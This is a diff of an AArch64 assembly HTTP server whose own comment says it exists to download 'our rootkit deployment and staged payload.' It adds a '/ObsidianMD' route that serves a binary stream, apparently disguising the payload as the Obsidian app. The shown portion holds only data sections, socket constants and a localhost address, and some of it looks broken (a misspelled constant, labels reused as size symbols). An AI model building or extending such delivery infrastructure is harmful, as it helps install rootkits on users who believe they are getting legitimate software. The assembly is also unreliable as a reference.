@@ -1,20 +1,46 @@
+//////////////////////////////////////////////////////////////////////////
 // Aarch64 ASM HTTP Server
-// This is going to download our rootkit deployment and staged payload.
+// This is going to download our rootkit deployment and staged payload
+/////////////////////////////////////////////////////////////////////////
+
+true: .word 1
+
+// New Line
+.align 4
+newline: .ascii "\n"
+// Index Route
+.align 4
+index_route: .ascii "GET /"
+// Download Route
+.align 4
+download_route: .ascii "GET /ObsidianMD"
+// No Route 
+.align 4
+no_response_found:
+    .ascii "HTTP/1.1 404 Not Found\n\r\nNot Found"
+no_response_found = . - no_response_found
+// Download Resource 
+.align 4
+ok_download_resource:
+    .ascii "HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\r\n"
+ok_download_resource = . - ok_download_resource
+
 
 .data 
 
 server_fd: .quad 0
 client_fd: .quad 0
 
-reuse_opt .int 1 // enable reuse
 
+.equ SOL_SOCKET, 0xffff
+.equ SO_REUSERADDR, 0x4
 .equ buffer, 1024
 
 sockaddr:
-    .short 2
-    .short 0x1f90
-    .int 0x0100007f
-    .space 8
+    .short 2 // AF_INET
+    .short 0x1f90 // 8080
+    .int 0x0100007f // Local Host
+    .space 8 // Allocaed uninitialized bytes of memory, we are reserving here.
 
 .text
 .global _start
@@ -62,3 +88,6 @@ _start:
 
     adrp x9, server_fd
     ldr x3, [x9, :lo12:server_fd]
+
+
+
